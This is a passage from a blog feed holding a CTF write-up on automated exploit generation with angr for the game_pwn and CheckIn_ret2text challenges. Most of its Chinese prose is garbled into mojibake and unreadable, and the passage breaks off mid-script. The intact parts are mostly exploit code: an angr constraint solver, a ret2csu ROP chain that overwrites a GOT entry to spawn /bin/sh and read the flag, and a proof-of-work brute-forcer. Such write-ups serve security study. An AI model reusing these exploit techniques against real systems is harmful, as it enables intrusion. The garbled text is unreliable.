class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="miniobs"><a href="#miniobs" class="headerlink" title="miniobs"></a>miniobs</h3>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>auto pwn</title>
    <link href="/2023/09/20/auto-pwn/"/>
    <url>/2023/09/20/auto-pwn/</url>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡å·²åœ¨çœ‹é›ªä¸Šå‘è¡¨ï¼š<a href="https://bbs.kanxue.com/thread-278971.htm">https://bbs.kanxue.com/thread-278971.htm</a></p><p>â€‹                                                       </p><p>è¿™ç±»åˆ©ç”¨angrå»è‡ªåŠ¨æ¢æµ‹æ¼æ´çš„é¢˜åœ¨å¾ˆæ—©ä»¥å‰å°±çœ‹åˆ°è¿‡ï¼Œä½†æ˜¯åœ¨CTFä¸­ä¸ä¼šç›´æ¥ç»™é™„ä»¶ï¼Œè€Œæ˜¯ncè¿ä¸Šåæ¥æ”¶ä¸€æ®µbase64ç¼–ç ï¼Œå†å°†å…¶è§£ç ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¯æ¬¡å¾—åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶å¹¶ä¸æ˜¯å®Œå…¨ç›¸åŒï¼›å¦‚æœä¸ç»™å‡ºå®Œæ•´çš„dockeræ–‡ä»¶ï¼ˆæ‹¥æœ‰å‡ ä¸ªæ¥æ”¶åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿè¡Œï¼‰ï¼Œä¸ç„¶æœ¬åœ°æ˜¯å¾ˆéš¾å¤ç°çš„ã€‚</p><p>è¿™é‡Œæ‰¾çš„æ˜¯ä¸‰ä¸ªæ‹¥æœ‰å®Œæ•´dockeræ–‡ä»¶çš„é¢˜å’Œä¸€ä¸ªå¯ä»¥æä¾›ä¸¤ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶çš„é¢˜ï¼š</p><p><a href="https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020/tree/main/pwn/game_pwn">https://github.com/huaweictf/xctf_huaweicloud-qualifier-2020/tree/main/pwn/game_pwn</a></p><p><a href="https://github.com/P4nda0s/CheckIn_ret2text">https://github.com/P4nda0s/CheckIn_ret2text</a></p><p><a href="https://github.com/utisss/UTCTF-22/tree/33b6bae1338ddabc6c795387051a544cee8e1a16/pwn/pwn-aeg2">https://github.com/utisss/UTCTF-22/tree/33b6bae1338ddabc6c795387051a544cee8e1a16/pwn/pwn-aeg2</a></p><p><a href="https://github.com/cscosu/ctf-writeups/tree/8d7885461c734a3035cacc7e739c90c1bc7910a3/2021/utctf/AEG">https://github.com/cscosu/ctf-writeups/tree/8d7885461c734a3035cacc7e739c90c1bc7910a3/2021/utctf/AEG</a></p><p>â€‹                                                         </p><h3 id="game-pwn"><a href="#game-pwn" class="headerlink" title="game_pwn"></a>game_pwn</h3><p>é¢˜ç›®ä¸€å¼€å§‹å°±ç›´æ¥å‘é€base64ç¼–ç ï¼Œç„¶åè®©æˆ‘ä»¬è¾“å…¥ä¸€æ®µæ•°æ®ï¼Œè¿™é‡Œè¿˜ä¸çŸ¥é“è¿™ä¸²æ•°æ®æ˜¯ä»€ä¹ˆï¼Œå¹¶ä¸”ä¸€æ®µæ—¶é—´åå°±ä¼šå…³é—­ï¼š</p><img src="/img/18/Screenshot 2023-09-21 123856.png" style="zoom:80%;" /><p>â€‹                                    </p><p>è§£ç å¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶åç›´æ¥ä½¿ç”¨idaåˆ†æï¼Œä¸»å‡½æ•°ä¸­å°†ç¨‹åºæ¥æ”¶åˆ°çš„ç¬¬ä¸€ä¸ªå‚æ•°è½¬åŒ–ä¸ºæ•´æ•°åä½œä¸ºsub_4006F9å‡½æ•°çš„çš„å‚æ•°ï¼š</p><img src="/img/18/Screenshot 2023-09-21 145019.png" style="zoom:80%;" /><p>â€‹                                      </p><p>sub_4006F9å‡½æ•°ä¸­åˆ©ç”¨è¿™ä¸ªå‚æ•°å»é€šè¿‡ä¸€ç³»åˆ—åˆ¤æ–­ï¼Œå¦‚æœæ»¡è¶³è¿™äº›çº¦æŸå°±å¯ä»¥æ‰§è¡Œreadå‡½æ•°å»æ ˆæº¢å‡ºï¼š</p><img src="/img/18/Screenshot 2023-09-21 145150.png" style="zoom:80%;" /><p>â€‹                              </p><p>ç»§ç»­æ¥æ”¶å¤šä¸ªæ–‡ä»¶ï¼Œå‘ç°æ¯ä¸ªæ–‡ä»¶ä¸­sub_4006F9å‡½æ•°ä¸­çš„çº¦æŸæ¡ä»¶éƒ½æ˜¯ä¸åŒçš„ï¼›æˆ‘ä»¬æ¯æ¬¡å»åˆ†æè¿™äº›çº¦æŸè‚¯å®šä¼šæµªè´¹å¤§é‡æ—¶é—´ï¼Œåœ¨é¢˜ç›®æ‹¥æœ‰æ—¶é—´é™åˆ¶çš„æƒ…å†µä¸‹å®Œå…¨ä¸åˆé€‚ï¼Œè¿™é‡Œå°±è¦ç”¨åˆ°angrå»è‡ªåŠ¨åˆ¤æ–­çº¦æŸæ¡ä»¶ã€‚</p><p>angrçš„ç”¨æ³•å¯ä»¥ç›´æ¥å‚è€ƒè¿™äº›æ–‡æ¡£ï¼š<a href="https://docs.angr.io/en/latest/">https://docs.angr.io/en/latest/</a>   ã€   <a href="https://xz.aliyun.com/t/7117">https://xz.aliyun.com/t/7117</a></p><p>æœ€å¥½å…ˆå»æ‹¿angr ctfå…ˆå»ç»ƒæ‰‹ï¼ŒåŠ æ·±ç†è§£ï¼š<a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a>    ã€ <a href="https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/">https://arttnba3.cn/2022/11/24/ANGR-0X00-ANGR_CTF/</a></p><p>éœ€è¦åˆ¤æ–­çº¦æŸçš„åªæœ‰sub_4006F9å‡½æ•°ï¼Œç›´æ¥å°†å…¶ä½œä¸ºåˆå§‹çŠ¶æ€ï¼Œè€Œç›®æ ‡åœ°å€åœ¨readå‡½æ•°å¤„ï¼Œå°†rdiä½œä¸ºéœ€è¦æ±‚è§£å¯¹è±¡ï¼Œå¾ˆå®¹æ˜“å†™å‡ºè‡ªåŠ¨æ±‚è§£çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br>binary_name = <span class="hljs-string">&quot;a&quot;</span><br>proj = angr.Project(binary_name)<br>start_addr = <span class="hljs-number">0x4006F9</span><br>init_state = proj.factory.blank_state(addr = start_addr)<br>num_bvs = claripy.BVS(<span class="hljs-string">&#x27;num&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>init_state.regs.rdi = num_bvs<br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = find_addr)<br><span class="hljs-keyword">if</span> simgr.found:<br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    num = solution_state.solver.<span class="hljs-built_in">eval</span>(num_bvs, cast_to=<span class="hljs-built_in">int</span>)<br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br></code></pre></td></tr></table></figure><p>åœ¨ä¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œé™¤äº†start_addrç›¸åŒï¼Œç›®æ ‡åœ°å€æ˜¯ä¸åŒçš„ï¼Œå¹¶ä¸”æ²¡æœ‰ç¬¦å·è¡¨ï¼Œåªèƒ½é€šè¿‡ç‰¹å®šçš„æ±‡ç¼–æœºå™¨ç æ‰¾åˆ°å¯¹åº”çš„åœ°å€ã€‚å®˜æ–¹çš„wpæ˜¯ä½¿ç”¨objdumpå‘½ä»¤å»æ‰¾ï¼Œè¿™é‡Œæˆ‘ç›´æ¥ä½¿ç”¨pwntoolså»æœç´¢ï¼Œæ›´åŠ æ–¹ä¾¿ã€‚</p><p>å¾—åˆ°é€šè¿‡çº¦æŸæ¡ä»¶çš„æ•´æ•°åï¼Œå¯ä»¥çŸ¥é“æœ€å¼€å§‹çš„è¾“å…¥å°±æ˜¯è¿™ä¸ªæ•´æ•°ï¼Œç„¶åç»§ç»­è¾“å…¥æ ˆæº¢å‡ºï¼›æ ˆæº¢å‡ºåå»ret2csuç»§ç»­è°ƒç”¨readå‡½æ•°å»ä¿®æ”¹readå‡½æ•°gotè¡¨çš„æœ€åä¸€å­—èŠ‚ï¼Œä¿®æ”¹ä¸ºæŒ‡å‘syscallæŒ‡ä»¤çš„åœ°å€ï¼Œå†è°ƒç”¨atoiå°†raxèµ‹å€¼ä¸º0x3bï¼Œæœ€åè°ƒç”¨readå‡½æ•°ï¼Œè¿™æ—¶readå‡½æ•°gotæŒ‡å‘syscallæŒ‡ä»¤ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿè°ƒç”¨å»getshellã€‚</p><p>â€‹</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">import</span> base64<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>p.recvline()<br>p.recvline()<br>bin_data = base64.b64decode(p.recvline().decode())<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(bin_data)<br>binary_name = <span class="hljs-string">&quot;b&quot;</span><br><span class="hljs-comment">#ä½¿ç”¨pwntoolsæœç´¢æŒ‡ä»¤å¾—åˆ°ç›¸åº”çš„åœ°å€</span><br>elf = ELF(binary_name, checksec=<span class="hljs-literal">False</span>)<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>find_addr = elf.search(asm(<span class="hljs-string">&#x27;mov rsi, rax&#x27;</span>)).__next__() + <span class="hljs-number">3</span><br>avoid_addr = find_addr + <span class="hljs-number">0x1b</span><br>avoid_addr1 = find_addr + <span class="hljs-number">0x11</span><br>csu_addr1 = elf.search(asm(<span class="hljs-string">&#x27;add rsp, 8;pop rbx&#x27;</span>)).__next__() + <span class="hljs-number">4</span><br>csu_addr2 = csu_addr1 - <span class="hljs-number">0x1a</span><br>pop_rdi_ret = csu_addr1 + <span class="hljs-number">9</span><br>pop_rsi_r15_ret = csu_addr1 + <span class="hljs-number">7</span><br><br><span class="hljs-comment">#ä½¿ç”¨angrå¾—åˆ°é€šè¿‡çº¦æŸçš„æ•´æ•°</span><br>proj = angr.Project(binary_name)<br>start_addr = <span class="hljs-number">0x4006F9</span><br>init_state = proj.factory.blank_state(addr = start_addr)<br>num_bvs = claripy.BVS(<span class="hljs-string">&#x27;num&#x27;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>init_state.regs.rdi = num_bvs<br><span class="hljs-comment"># def fail(state):</span><br><span class="hljs-comment">#     if state.addr &lt;= avoid_addr and state.addr &gt;= avoid_addr1:</span><br><span class="hljs-comment">#         return True</span><br><span class="hljs-comment">#     else:</span><br><span class="hljs-comment">#         return False</span><br>num = <span class="hljs-number">0</span><br>oversize = <span class="hljs-number">0</span><br>simgr = proj.factory.simgr(init_state)<br>simgr.explore(find = find_addr, avoid = avoid_addr)<br><span class="hljs-keyword">if</span> simgr.found:<br>    solution_state = simgr.found[<span class="hljs-number">0</span>]<br>    num = solution_state.solver.<span class="hljs-built_in">eval</span>(num_bvs, cast_to=<span class="hljs-built_in">int</span>)<br>    oversize = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.regs.rbp) - solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.regs.rsi) <span class="hljs-comment">#ä¸åŒäºŒè¿›åˆ¶æ–‡ä»¶çš„æº¢å‡ºå¤§å°ä¸åŒï¼Œè¿™é‡Œè®¡ç®—å¾—åˆ°æº¢å‡ºå¤§å°</span><br><span class="hljs-keyword">else</span> :<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Could not find the solution&#x27;</span>)<br>    exit()<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(num).encode())<br><span class="hljs-comment">#æ ˆæº¢å‡ºgetshell</span><br><span class="hljs-comment"># start_process = &#x27;./&#x27; + binary_name + &#x27; &#x27; + str(num)</span><br><span class="hljs-comment"># p = process(start_process.split())</span><br><span class="hljs-comment"># gdb.attach(p, &quot;b *&quot; + str(find_addr + 10))</span><br><span class="hljs-comment"># pause()</span><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * oversize + p64(<span class="hljs-number">0</span>) + p64(csu_addr1)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x11</span>) + p64(<span class="hljs-number">0x601010</span>) + p64(<span class="hljs-number">0</span>) + p64(csu_addr2)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601010</span>) + p64(csu_addr2)<br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>) + p64(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x601018</span>) + p64(csu_addr2)<br>p.send(payload)<br>sleep(<span class="hljs-number">0.5</span>)<br>payload = <span class="hljs-string">b&#x27;59&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="hljs-string">b&#x27;\x5e&#x27;</span><br>p.send(payload)<br>p.sendline(<span class="hljs-string">b&quot;cat flag&quot;</span>)<br>flag = p.recvline()<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-comment">#p.interactive()</span><br></code></pre></td></tr></table></figure><h3 id="CheckIn-ret2text"><a href="#CheckIn-ret2text" class="headerlink" title="CheckIn_ret2text"></a>CheckIn_ret2text</h3><p>è¿™é¢˜è¿ä¸Šåéœ€è¦çˆ†ç ´å‰å››ä½æ•°æ®ä¸sha256åŠ å¯†åçš„æ•°æ®å¯¹æ¯”ï¼Œé€šè¿‡è¿™ä¸ªåˆ¤æ–­åå¯ä»¥å¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶base64ç¼–ç ï¼š</p><img src="/img/18/Screenshot 2023-09-21 124024.png" style="zoom:100%;" /><p>â€‹                                        </p><p>é¢˜ç›®çš„ä¸»å‡½æ•°å°±æ˜¯ä¸€å †åˆ¤æ–­ï¼Œinput_valå‡½æ•°æ˜¯è¾“å…¥çš„æ•°å­—ï¼Œinput_lineå‡½æ•°æ˜¯è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œfksthå‡½æ•°æ˜¯æ¯”è¾ƒå­—ç¬¦ä¸²ï¼Œé¢˜ç›®ç»™äº†åé—¨å‡½æ•°ï¼Œæ²¡æœ‰canaryï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ ˆæº¢å‡ºåå»è°ƒç”¨backdoorå‡½æ•°ï¼š</p><img src="/img/18/Screenshot 2023-09-21 160227.png" style="zoom:100%;" /><p>â€‹                                 </p><p>é€ æˆæº¢å‡ºçš„è¾“å…¥å‡½æ•°è‚¯å®šæ˜¯input_lineï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å†™å…¥åœ°å€ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å¤§å°ï¼›ä¸»å‡½æ•°ä¸­æœ‰å¤§é‡çš„input_lineå‡½æ•°è°ƒç”¨ï¼Œè€Œä¸”ç¬¬äºŒä¸ªå‚æ•°æ™®éä¸å¤§ï¼Œå¼€å§‹å°±ç›´æ¥æ‰¾åˆ°é è¿‘æ ˆåº•çš„å˜é‡ï¼Œæ‰¾åˆ°å…¶å¼•ç”¨çš„input_lineï¼š</p><img src="/img/18/Screenshot 2023-09-21 160620.png" style="zoom: 80%;" /><p>â€‹                                  </p><p>æœç„¶å¯ä»¥æ‰¾åˆ°æ ˆæº¢å‡ºï¼š</p><img src="/img/18/Screenshot 2023-09-21 160701.png" style="zoom:80%;" /><p>â€‹                                                                   </p><p>ä¸åŒçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­fksthå‡½æ•°æ¯”è¾ƒçš„å­—ç¬¦ä¸²æ˜¯ä¸åŒçš„ï¼Œåˆ¤æ–­çš„æ•°å­—ä¹Ÿæ˜¯ä¸åŒçš„ï¼Œè¿™é‡Œä¾ç„¶æ˜¯ä½¿ç”¨angrå»æ±‚è§£çº¦æŸã€‚</p><p>å‡ºé¢˜äººçš„wpå·²ç»å¾ˆè¯¦ç»†äº†ï¼Œç›´æ¥ä½¿ç”¨unconstrained stateæ±‚è§£å°±å¾—åˆ°ä¸€ä¸ªå®Œæ•´çš„payloadï¼ˆè¿™ç§æ–¹æ³•tqlï¼‰ã€‚è‡ªå·±å¤ç°æ—¶å°†<code>proj.factory.entry_state()</code>ä¿®æ”¹ä¸ºæŒ‡å®šmainå‡½æ•°çš„åœ°å€ï¼Œä½†æ˜¯å´å¾—ä¸åˆ°æ­£ç¡®çš„payloadï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯unconstrained stateæ±‚è§£çš„å½±å“ã€‚</p><p>æœ€åè‡ªå·±ä¹Ÿé‡‡ç”¨ä¼ ç»Ÿçš„æ–¹æ³•â€”â€”ç›´æ¥æ‰¾åˆ°å¯ä»¥å‘ç”Ÿæ ˆæº¢å‡ºçš„åœ°å€ï¼Œæ”¹å†™äº†ä¸€ä¸‹ã€‚</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pass_proof</span>(<span class="hljs-params">salt, <span class="hljs-built_in">hash</span></span>):<br>    <span class="hljs-built_in">dir</span> = string.ascii_letters + string.digits<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        rand_str = (<span class="hljs-string">&#x27;&#x27;</span>.join([random.choice(<span class="hljs-built_in">dir</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)])).encode() + salt<br>        <span class="hljs-keyword">if</span> hashlib.sha256(rand_str).hexdigest() == <span class="hljs-built_in">hash</span>.decode() :<br>            <span class="hljs-keyword">return</span> rand_str[:<span class="hljs-number">4</span>]<br><br>p = remote(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">9999</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;sha256(xxxx + &#x27;</span>)<br>salt = p.recvuntil(<span class="hljs-string">b&#x27;)&#x27;</span>)[:-<span class="hljs-number">1</span>]<br>p.recvuntil(<span class="hljs-string">b&#x27; == &#x27;</span>)<br><span class="hljs-built_in">hash</span> = p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">2</span>]<br>t = pass_proof(salt, <span class="hljs-built_in">hash</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;give me xxxx:&quot;</span>, t)<br>p.recvline()<br>bin_data = base64.b64decode(p.recvline().decode())<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>).write(bin_data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_str</span>(<span class="hljs-params">state, addr</span>):<br>    s, i = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        ch = state.solver.<span class="hljs-built_in">eval</span>(state.memory.load(addr + i, <span class="hljs-number">1</span>))<br>        <span class="hljs-keyword">if</span> ch == <span class="hljs-number">0</span>: <br>            <span class="hljs-keyword">break</span><br>        s += <span class="hljs-built_in">chr</span>(ch)<br>        i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> s<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_global_val</span>(<span class="hljs-params">state, bvs, <span class="hljs-built_in">type</span></span>):<br>    name = <span class="hljs-string">&quot;s_&quot;</span> + <span class="hljs-built_in">str</span>(state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>])<br>    state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>] += <span class="hljs-number">1</span><br>    state.<span class="hljs-built_in">globals</span>[name] = (bvs, <span class="hljs-built_in">type</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_init</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>            <span class="hljs-keyword">return</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_input_line</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, buf_addr, size</span>):<br>            size = self.state.solver.<span class="hljs-built_in">eval</span>(size)<br>            buf_bvs = claripy.BVS(<span class="hljs-string">&quot;buf&quot;</span>, size * <span class="hljs-number">8</span>)<br>            save_global_val(self.state, buf_bvs, <span class="hljs-string">&quot;str&quot;</span>)<br>            self.state.memory.store(buf_addr, buf_bvs)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_input_val</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>            num_bvs = claripy.BVS(<span class="hljs-string">&quot;num&quot;</span>, <span class="hljs-number">4</span> * <span class="hljs-number">8</span>)<br>            save_global_val(self.state, num_bvs, <span class="hljs-string">&quot;int&quot;</span>)<br>            self.state.regs.rax = num_bvs<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">replace_fksth</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, str1_addr, str2_addr</span>):<br>            str2 = load_str(self.state, str2_addr).encode()<br>            str1 = self.state.memory.load(str1_addr, <span class="hljs-built_in">len</span>(str2))<br>            self.state.regs.rax = claripy.If(str1 == str2, claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>), claripy.BVV(<span class="hljs-number">1</span>, <span class="hljs-number">32</span>))<br><br>binary_name = <span class="hljs-string">&quot;a&quot;</span><br>proj = angr.Project(binary_name)<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z4initv&quot;</span>, replace_init())<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z10input_linePcm&quot;</span>, replace_input_line())<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z9input_valv&quot;</span>, replace_input_val())<br>proj.hook_symbol(<span class="hljs-string">&quot;_Z5fksthPKcS0_&quot;</span>, replace_fksth())<br>symbol = proj.loader.find_symbol(<span class="hljs-string">&quot;main&quot;</span>)<br>start_addr = symbol.rebased_addr<br>init_state = proj.factory.blank_state(addr = start_addr)<br>init_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;count&#x27;</span>] = <span class="hljs-number">0</span><br><br>find_addr = proj.loader.find_symbol(<span class="hljs-string">&#x27;_Z10input_linePcm&#x27;</span>).rebased_addr<br><br><span class="hljs-comment">#åˆ¤æ–­åœ¨input_lineä¸­æ˜¯å¦å‘ç”Ÿæº¢å‡º</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">success</span>(<span class="hljs-params">state</span>):<br>    <span class="hljs-keyword">if</span> state.addr == find_addr:<br>        reg_rbp = state.regs.rbp<br>        reg_rdi = state.regs.rdi<br>        reg_rsi = state.regs.rsi<br>        add_addr = reg_rdi + reg_rsi<br>        copied_state = state.copy()<br>        copied_state.add_constraints(reg_rbp &lt; add_addr)<br>        <span class="hljs-keyword">if</span> copied_state.satisfiable():<br>            state.add_constraints(reg_rbp &lt; add_addr)<br>            state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;overflow&#x27;</span>] = (state.solver.<span class="hljs-built_in">eval</span>(reg_rbp) - state.solver.<span class="hljs-built_in">eval</span>(reg_rdi), state.solver.<span class="hljs-built_in">eval</span>(reg_rsi))  <span class="hljs-comment">#ä¿å­˜æº¢å‡ºå¤§å°å’Œè¾“å…¥å¤§å°</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        